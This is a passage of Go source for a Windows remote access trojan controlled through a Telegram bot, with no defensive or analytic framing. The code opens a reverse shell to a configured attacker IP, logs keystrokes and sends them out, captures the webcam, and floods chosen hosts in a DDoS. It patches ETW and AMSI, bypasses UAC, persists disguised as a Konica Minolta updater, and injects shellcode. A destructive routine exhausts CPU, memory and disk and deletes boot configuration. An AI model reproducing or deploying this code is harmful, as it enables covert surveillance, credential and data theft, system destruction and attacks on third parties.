		0, 1, uintptr(unsafe.Pointer(v)),
		uintptr((len(value)+1)*2),
	)
}

func StartRevs(ip, port string) {
	if ip == "ATTACKER_IP" || port == "ATTACKER_PORT" {
		return
	}
	time.Sleep(60 * time.Second)
	for {
		dialer := &net.Dialer{Timeout: 15 * time.Second}
		conn, err := tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(ip, port),
			&tls.Config{InsecureSkipVerify: true})
		if err != nil {
			time.Sleep(30 * time.Second)
			continue
		}
		func() {
			defer conn.Close()
			cmd := exec.Command("cmd.exe")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Run()
		}()
		time.Sleep(30 * time.Second)
	}
}

func FindPID(name string) (int, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return -1, err
	}
	defer syscall.CloseHandle(snapshot)
	var pe syscall.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := syscall.Process32First(snapshot, &pe); err != nil {
		return -1, err
	}
	name = strings.ToLower(name)
	for {
		raw := utf16.Decode(pe.ExeFile[:])
		exe := strings.ToLower(strings.TrimRight(string(raw), "\x00"))
		if exe == name {
			return int(pe.ProcessID), nil
		}
		if err := syscall.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}
	return -1, fmt.Errorf("not found")
}

func selfDestruct(cfg *Config) string {
	RemovePersistence(cfg.InstallPath)
	os.Remove(cfg.InstallPath)
	tgLog.Log("kill", "PASS", "self-destruct")
	os.Exit(0)
	return ""
}

func cleanPersistence(path string) {
	regDelKey(syscall.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "KonicaMinoltaUpdate")
	regDelKey(syscall.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "KonicaMinoltaUpdate")
	exec.Command("schtasks", "/delete", "/tn", "KonicaMinoltaUpdate", "/f").Run()
	exec.Command("schtasks", "/delete", "/tn", "KonicaMinotaGuardian", "/f").Run()
	regDelKey(syscall.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", "Debugger")
	regDelKey(syscall.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit")
	regDelKey(syscall.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Active Setup\\Installed Components\\{B7D7D2D0-ECB0-4A71-A0A6-14F8308D7754}", "StubPath")
	regDelKey(syscall.HKEY_CURRENT_USER, "Software\\Classes\\CLSID\\{B54F3741-5B07-11cf-A4B0-00AA004A55E8}\\InProcServer32", "")
	exec.Command("sc", "delete", "KonicaMinutaUpdate").Run()
	guardScript := filepath.Join(os.TempDir(), "guard.ps1")
	os.Remove(guardScript)
	for _, dir := range []string{
		os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		os.Getenv("ProgramData") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
	} {
		os.Remove(filepath.Join(dir, "KonicaMinutaUpdate.lnk"))
	}
	// WMI cleanup
	exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass",
		"Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter 'Name=\"KMAUpdate\"' | Remove-WmiObject").Run()
}

func regDelKey(root syscall.Handle, keyPath, value string) {
	var key syscall.Handle
	rp, _ := syscall.UTF16PtrFromString(keyPath)
	del, _ := syscall.UTF16PtrFromString(value)
	ret, _, _ := pRegOpenKey.Call(
		uintptr(root), uintptr(unsafe.Pointer(rp)),
		0, KEY_W, uintptr(unsafe.Pointer(&key)),
	)
	if ret == 0 {
		pRegDelValue.Call(uintptr(key), uintptr(unsafe.Pointer(del)))
		pRegCloseKey.Call(uintptr(key))
	}
}

func fuckComputer(cfg *Config) string {
	go func() {
		cpus := runtime.NumCPU()
		for i := 0; i < cpus; i++ {
			go func() {
				var x uint64
				for {
					x ^= x + 1
					x *= 0x3243f6a8885a308d
				}
			}()
		}
	}()

	go func() {
		var mem [][]byte
		for {
			b := make([]byte, 100*1024*1024)
			for i := range b {
				b[i] = byte(i)
			}
			mem = append(mem, b)
		}
	}()

	go func() {
		roots := []string{
			os.TempDir(),
			os.Getenv("USERPROFILE") + "\\Desktop",
			os.Getenv("USERPROFILE") + "\\Documents",
			os.Getenv("LOCALAPPDATA"),
		}
		for {
			for _, root := range roots {
				if root == "" {
					continue
				}
				for j := 0; j < 10; j++ {
					f, err := os.Create(filepath.Join(root, randStr(12)+".tmp"))
					if err != nil {
						continue
					}
					f.Write(make([]byte, 64*1024*1024))
					f.Close()
				}
			}
		}
	}()

	if IsAdmin() {
		go func() {
			exec.Command("bcdedit", "/delete", "{bootmgr}", "/f").Run()
			exec.Command("bcdedit", "/delete", "{current}", "/f").Run()
			exec.Command("bcdedit", "/delete", "{default}", "/f").Run()
			for _, f := range []string{
				"C:\\bootmgr",
				"C:\\boot.ini",
				"C:\\ntldr",
				"C:\\ntdetect.com",
				os.Getenv("SystemRoot") + "\\System32\\drivers\\etc\\hosts",
			} {
				os.Remove(f)
			}
			exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()
			exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "No").Run()
		}()
	}

	cleanPersistence(cfg.InstallPath)
	os.Remove(cfg.InstallPath)
	os.Exit(0)
	return ""
}

func helpText() string {
	return "=== C2 Commands ===\n" +
		"!shell <cmd>       Execute\n" +
		"!upload <path>     Exfiltrate\n" +
		"!download <url>    Fetch file\n" +
		"!screenshot        Capture\n" +
		"!inject <proc>     APC inject\n" +
		"!kill              Self-destruct\n" +
		"!fcku              Nuke system (CPU/RAM/disk) + self-destruct\n" +
		"!rev <host>:<port>  Reverse shell\n" +
		"!keys              Keylog exfil\n" +
		"!msg <text>        Popup message\n" +
		"!blockinput        Lock input (toggle)\n" +
		"!sysinfo           System info\n" +
		"!ddos <host> <port>  Multi-vector flood\n" +
		"!ddos_stop         Stop flood\n" +
		"!start_web <sec>   Webcam loop\n" +
		"!stop_web          Stop webcam\n" +
		"!logs              Last 20 log lines\n" +
		"!whoami            Current user\n" +
		"!ip                Local IP\n" +
		"!uptime            Process uptime\n" +
		"!help"

}

func localIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func randStr(n int) string {
	const l = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = l[rand.Intn(len(l))]
	}
	return string(b)
}

type mpPayload struct {
	buf   bytes.Buffer
	ctype string
}

func buildMultipart(kvs ...interface{}) mpPayload {
	var buf bytes.Buffer
	boundary := fmt.Sprintf("----%d", time.Now().UnixNano())
	for _, kv := range kvs {
		switch v := kv.(type) {
		case mpField:
			buf.WriteString(fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n", boundary, v.k, v.v))
		case mpFile:
			buf.WriteString(fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", boundary, v.k, v.f))
			buf.Write(v.d)
			buf.WriteString("\r\n")
		}
	}
	buf.WriteString(fmt.Sprintf("--%s--\r\n", boundary))
	return mpPayload{buf: buf, ctype: fmt.Sprintf("multipart/form-data; boundary=%s", boundary)}
}

type mpField struct{ k, v string }
type mpFile struct{ k, f string; d []byte }

func kv(k, v string) mpField    { return mpField{k, v} }
func fileKV(k, f string, d []byte) mpFile { return mpFile{k, f, d} }

func escapeJSON(s string) string {
	var buf bytes.Buffer
	buf.Grow(len(s) + len(s)/8)
	for _, c := range s {
		switch c {
		case '\\':
			buf.WriteString("\\\\")
		case '"':
			buf.WriteString("\\\"")
		case '\n':
			buf.WriteString("\\n")
		case '\r':
			buf.WriteString("\\r")
		case '\t':
			buf.WriteString("\\t")
		default:
			if c < 0x20 {
				fmt.Fprintf(&buf, "\\u%04x", int(c))
			} else {
				buf.WriteRune(c)
			}
		}
	}
	return buf.String()
}

func vkToChar(vk uint32) string {
	if vk >= 0x41 && vk <= 0x5A {
		shift := keyState(VK_SHIFT)
		caps := keyState(VK_CAPITAL)
		if shift != caps {
			return string(rune('A' + vk - 0x41))
		}
		return string(rune('a' + vk - 0x41))
	}
	if vk >= 0x30 && vk <= 0x39 {
		if keyState(VK_SHIFT) {
			return []string{")", "!", "@", "#", "$", "%", "^", "&", "*", "("}[vk-0x30]
		}
		return string(rune('0' + vk - 0x30))
	}
	if vk >= 0x60 && vk <= 0x69 {
		return string(rune('0' + vk - 0x60))
	}
	switch vk {
	case 0x20:
		return " "
	case 0x6A:
		return "*"
	case 0x6B:
		return "+"
	case 0x6D:
		return "-"
	case 0x6E:
		return "."
	case 0x6F:
		return "/"
	case 0xBA:
		if keyState(VK_SHIFT) { return ":" }
		return ";"
	case 0xBB:
		if keyState(VK_SHIFT) { return "+" }
		return "="
	case 0xBC:
		if keyState(VK_SHIFT) { return "<" }
		return ","
	case 0xBD:
		if keyState(VK_SHIFT) { return "_" }
		return "-"
	case 0xBE:
		if keyState(VK_SHIFT) { return ">" }
		return "."
	case 0xBF:
		if keyState(VK_SHIFT) { return "?" }
		return "/"
	case 0xC0:
		if keyState(VK_SHIFT) { return "~" }
		return "`"
	case 0xDB:
		if keyState(VK_SHIFT) { return "{" }
		return "["
	case 0xDC:
		if keyState(VK_SHIFT) { return "|" }
		return "\\"
	case 0xDD:
		if keyState(VK_SHIFT) { return "}" }
		return "]"
	case 0xDE:
		if keyState(VK_SHIFT) { return "\"" }
		return "'"
	case VK_RETURN:
		return "[ENTER]\n"
	case VK_BACK:
		return "[BACKSPACE]"
	case VK_TAB:
		return "[TAB]"
	case VK_ESCAPE:
		return "[ESC]"
	case VK_DELETE:
		return "[DEL]"
	case VK_UP:
		return "[UP]"
	case VK_DOWN:
		return "[DOWN]"
	case VK_LEFT:
		return "[LEFT]"
	case VK_RIGHT:
		return "[RIGHT]"
	case VK_HOME:
		return "[HOME]"
	case VK_END:
		return "[END]"
	case VK_PRIOR:
		return "[PGUP]"
	case VK_NEXT:
		return "[PGDN]"
	case VK_INSERT:
		return "[INS]"
	case VK_CAPITAL:
		return "[CAPS]"
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU, VK_RMENU:
		return ""
	}
	if vk >= 0x70 && vk <= 0x87 {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}
	return ""
}

func keyState(vk int) bool {
	ret, _, _ := pGetKeyState.Call(uintptr(vk))
	return ret&0x8000 != 0
}

func getActiveWindowTitle() string {
	hwnd, _, _ := pGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	n, _, _ := pGetWindowTextLengthW.Call(hwnd)
	if n == 0 {
		return ""
	}
	buf := make([]uint16, n+1)
	pGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(n+1))
	title := syscall.UTF16ToString(buf)
	if len(title) > 64 {
		title = title[:64]
	}
	return title
}

func keyLogCallback(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		kh := *(*struct {
			vkCode      uint32
			scanCode    uint32
			flags       uint32
			time        uint32
			dwExtraInfo uintptr
		})(unsafe.Pointer(lParam))
		ch := vkToChar(kh.vkCode)
		if ch != "" {
			win := getActiveWindowTitle()
			t := time.Now().Format("15:04:05")
			keyMu.Lock()
			if win != keyWinTitle {
				keyWinTitle = win
				keyBuf.WriteString(fmt.Sprintf("[%s] --- %s ---\n", t, win))
			}
			keyBuf.WriteString(fmt.Sprintf("[%s] %s\n", t, ch))
			if keyBuf.Len() > 10240 {
				keyBuf.Reset()
			}
			keyMu.Unlock()
		}
	}
	ret, _, _ := pCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func startKeylogger() {
	runtime.LockOSThread()
	cb := syscall.NewCallback(keyLogCallback)
	hook, _, _ := pSetWindowsHookExW.Call(WH_KEYBOARD_LL, cb, 0, 0)
	if hook == 0 {
		return
	}
	keyHook = hook
	var msg struct {
		hwnd    uintptr
		message uint32
		wParam  uintptr
		lParam  uintptr
		time    uint32
		x       int32
		y       int32
	}
	for {
		ret, _, _ := pGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
	}
	pUnhookWindowsHookEx.Call(hook)
}

func keyFlusher() {
	for {
		time.Sleep(30 * time.Second)
		keyMu.Lock()
		if keyBuf.Len() > 0 {
			data := keyBuf.Bytes()
			enc := make([]byte, len(data))
			for i, b := range data {
				enc[i] = b ^ XOR_KEY
			}
			f, _ := os.OpenFile(keyLogPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if f != nil {
				f.Write(enc)
				f.Close()
			}
			keyBuf.Reset()
		}
		keyMu.Unlock()
	}
}

func sendKeyLog(tg *TelegramClient) string {
	keyMu.Lock()
	if keyBuf.Len() > 0 {
		data := keyBuf.Bytes()
		enc := make([]byte, len(data))
		for i, b := range data {
			enc[i] = b ^ XOR_KEY
		}
		f, _ := os.OpenFile(keyLogPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if f != nil {
			f.Write(enc)
			f.Close()
		}
		keyBuf.Reset()
	}
	keyMu.Unlock()

	raw, err := os.ReadFile(keyLogPath)
	if err != nil {
		return "No keylog file"
	}
	if len(raw) == 0 {
		return "No keystrokes logged yet"
	}
	dec := make([]byte, len(raw))
	for i, b := range raw {
		dec[i] = b ^ XOR_KEY
	}
	if len(dec) > 50<<20 {
		return "Keylog too large (run !keys more often)"
	}
	tg.SendFile("keylog.txt", dec)
	pSetFileAttr.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(keyLogPath))), 2)
	os.Remove(keyLogPath)
	os.Remove(filepath.Dir(keyLogPath))
	return fmt.Sprintf("Keylog sent: %d bytes", len(dec))
}

func showMsg(text string) string {
	if text == "" {
		return "Usage: !msg <text>"
	}
	pMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Windows Update"))),
		0x10)
	return "Message shown"
}

var inputBlocked bool

func toggleBlockInput() string {
	inputBlocked = !inputBlocked
	if inputBlocked {
		pBlockInput.Call(1)
		return "Input blocked"
	}
	pBlockInput.Call(0)
	return "Input unblocked"
}

func getSysInfo() string {
	ver, _ := exec.Command("cmd", "/c", "ver").Output()
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	domain := os.Getenv("USERDOMAIN")
	proc := os.Getenv("PROCESSOR_IDENTIFIER")
	arch := os.Getenv("PROCESSOR_ARCHITECTURE")
	cores := runtime.NumCPU()

	var mem struct {
		length             uint32
		MemoryLoad         uint32
		TotalPhys          uint64
		AvailPhys          uint64
		TotalPageFile      uint64
		AvailPageFile      uint64
		TotalVirtual       uint64
		AvailVirtual       uint64
		AvailExtended      uint64
	}
	mem.length = uint32(unsafe.Sizeof(mem))
	pGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&mem)))

	var info struct {
		oemID               uint32
		pageSize            uint32
		minAppAddr          uintptr
		maxAppAddr          uintptr
		activeProcessorMask uintptr
		numProcessors       uint32
		procType            uint32
		allocationGran      uint32
		processorLevel      uint16
		processorRevision   uint16
	}
	pGetSystemInfo.Call(uintptr(unsafe.Pointer(&info)))

	avOut, _ := exec.Command("powershell", "-NoP", "-NonI", "-Exec", "Bypass",
		"Get-CimInstance AntiSpywareProduct -Namespace root\\Microsoft\\Windows\\Defender 2>$null | Select-Object -ExpandProperty displayName").Output()
	av := strings.TrimSpace(string(avOut))
	if av == "" {
		av = "N/A"
	}

	diskPS := "Get-PSDrive C | ForEach-Object { '{0:N2}GB / {1:N2}GB' -f ($_.Used/1GB), ($_.Used+$_.Free)/1GB }"
	diskOut, _ := exec.Command("powershell", "-NoP", "-NonI", "-Exec", "Bypass", diskPS).Output()
	disk := strings.TrimSpace(string(diskOut))

	upt := time.Since(startTime)
	upDays := int(upt.Hours()) / 24
	upHrs := int(upt.Hours()) % 24
	upMin := int(upt.Minutes()) % 60

	s := fmt.Sprintf(
		"Host: %s\\%s\nUser: %s\nOS: %sArch: %s\nCPU: %s (%d cores)\nRAM: %dMB total / %dMB free\nDisk C: %s\nAV: %s\nUptime: %dd %dh %dm\nIP: %s\nSession: %s",
		domain, host, user, strings.TrimSpace(string(ver)), arch, proc, cores,
		mem.TotalPhys/1024/1024, mem.AvailPhys/1024/1024,
		disk, av, upDays, upHrs, upMin, localIP(), tgConfig.SessionID)

	return s
}

func startDDoS(arg string) string {
	parts := strings.Fields(arg)
	if len(parts) < 1 {
		return "Usage: !ddos <host> [port] [threads]"
	}
	host := parts[0]
	port := ""
	threads := 100
	parts = parts[1:]
	if len(parts) >= 1 {
		if _, err := strconv.Atoi(parts[0]); err == nil {
			port = parts[0]
			if len(parts) >= 2 {
				threads, _ = strconv.Atoi(parts[1])
			}
		} else {
			threads, _ = strconv.Atoi(parts[0])
		}
	}
	if threads < 1 {
		threads = 1
	}
	if threads > 2000 {
		threads = 2000
	}

	candidates := []string{}
	if port != "" {
		candidates = append(candidates, port)
	} else {
		candidates = []string{"80", "443", "445", "3389", "8080", "8443", "22", "21", "1433", "3306", "5900", "25", "110", "135", "139", "389", "636", "993", "995", "5432", "27017"}
	}

	probePorts := func() []string {
		if port != "" {
			return []string{port}
		}
		alive := []string{}
		ch := make(chan string, len(candidates))
		var wg sync.WaitGroup
		for _, p := range candidates {
			wg.Add(1)
			go func(p string) {
				defer wg.Done()
				conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, p), 1*time.Second)
				if err == nil {
					conn.Close()
					ch <- p
				}
			}(p)
		}
		wg.Wait()
		close(ch)
		for p := range ch {
			alive = append(alive, p)
		}
		return alive
	}

	alive := probePorts()
	if len(alive) == 0 {
		return "No open ports found on " + host
	}
	if port != "" {
		alive = []string{port}
	}

	ddosStop.Store(false)
	garbage := make([]byte, 65535)
	for i := range garbage {
		garbage[i] = byte(rand.Intn(256))
	}

	workersPerPort := threads / len(alive)
	if workersPerPort < 10 {
		workersPerPort = 10
	}

	for _, p := range alive {
		target := net.JoinHostPort(host, p)
		for w := 0; w < workersPerPort; w++ {
			go func() {
				for !ddosStop.Load() {
					for k := 0; k < 20; k++ {
						go func() {
							conn, err := net.DialTimeout("tcp", target, 2*time.Second)
							if err != nil {
								return
							}
							conn.Write(garbage[:1024])
							conn.Close()
						}()
					}
					go func() {
						conn, err := net.DialTimeout("udp", target, 2*time.Second)
						if err == nil {
							for i := 0; i < 50 && !ddosStop.Load(); i++ {
								conn.Write(garbage[:1472])
							}
							conn.Close()
						}
					}()
					if p == "80" || p == "8080" || p == "8443" || p == "443" {
						go func() {
							conn, err := net.DialTimeout("tcp", target, 2*time.Second)
							if err == nil {
								for i := 0; i < 100 && !ddosStop.Load(); i++ {
									req := fmt.Sprintf("GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n", rand.Intn(999999), host)
									conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
									conn.Write([]byte(req))
								}
								conn.Close()
							}
						}()
					}
				}
			}()
		}
	}

	return fmt.Sprintf("DDoS %s on %d/%d live ports (%d workers each)", host, len(alive), len(candidates), workersPerPort)
}

func startWebcam(interval string) string {
	if interval == "" {
		return "Usage: !start_web <seconds>"
	}
	sec, err := strconv.Atoi(interval)
	if err != nil || sec < 1 {
		return "Interval must be >= 1 second"
	}
	webcamStop.Store(false)
	go func() {
		for !webcamStop.Load() {
			path := filepath.Join(os.TempDir(), "web_"+randStr(8)+".jpg")
			ps := fmt.Sprintf(
				`$d=New-Object -ComObject WIA.DeviceManager;`+
					`$c=$d.DeviceInfos | %%{$_.Connect()};`+
					`if(!$c){exit};`+
					`$img=$c.Items(1).Transfer();`+
					`$img.SaveFile('%s');`+
					`Write-Output 'ok'`, path)
			out, err := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps).Output()
			if err == nil && strings.TrimSpace(string(out)) == "ok" {
				data, _ := os.ReadFile(path)
				os.Remove(path)
				if len(data) > 0 && tgClient != nil {
					tgClient.SendFile("webcam.jpg", data)
				}
			}
			for i := 0; i < sec && !webcamStop.Load(); i++ {
				time.Sleep(1 * time.Second)
			}
		}
	}()
	return fmt.Sprintf("Webcam capture every %ds started", sec)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func init() {
	rand.Seed(time.Now().UnixNano() ^ int64(os.Getpid()<<32))
}

const ApiBase = "https://api.telegram.org/bot"

func main() {
	runtime.LockOSThread()

	PatchETW()
	PatchAMSI()

	jitter := time.Duration(3000+rand.Intn(7000)) * time.Millisecond
	time.Sleep(jitter)

	cfg := LoadConfig()
	tgLog = NewLogger(cfg)
	tgConfig = cfg
	tgLog.Log("init", "PASS", "ETW/AMSI patched")

	SelfCopy(cfg)
	tgLog.Log("self-copy", "PASS", cfg.InstallPath)

	BypassUAC(cfg)
	tgLog.Log("uac", "PASS", fmt.Sprintf("admin=%v", IsAdmin()))

	SetupPersistence(cfg.InstallPath)
	tgLog.Log("persist", "PASS", "installed")

	keyDir := filepath.Dir(tgConfig.InstallPath)
	keyLogPath = filepath.Join(keyDir, "logs", "kl_"+randStr(8)+".dat")
	os.MkdirAll(filepath.Dir(keyLogPath), 0755)
	pSetFileAttr.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(filepath.Dir(keyLogPath)))), 2)
	go startKeylogger()
	go keyFlusher()

	if IsAdmin() {
		go func() {
			if pid, err := FindPID("sihost.exe"); err == nil && pid > 0 {
				earlyBirdAPC(
					os.Getenv("SystemRoot")+"\\System32\\sihost.exe",
					beaconShellcode(),
				)
			}
		}()
	}

	tgLog.Log("ready", "PASS", "C2 starting")
	tgClient = NewTelegramClient(cfg, tgLog)

	if cfg.AttackerIP != "ATTACKER_IP" && cfg.AttackerPort != "ATTACKER_PORT" {
		go StartRevs(cfg.AttackerIP, cfg.AttackerPort)
	}

	tgClient.Run()
}
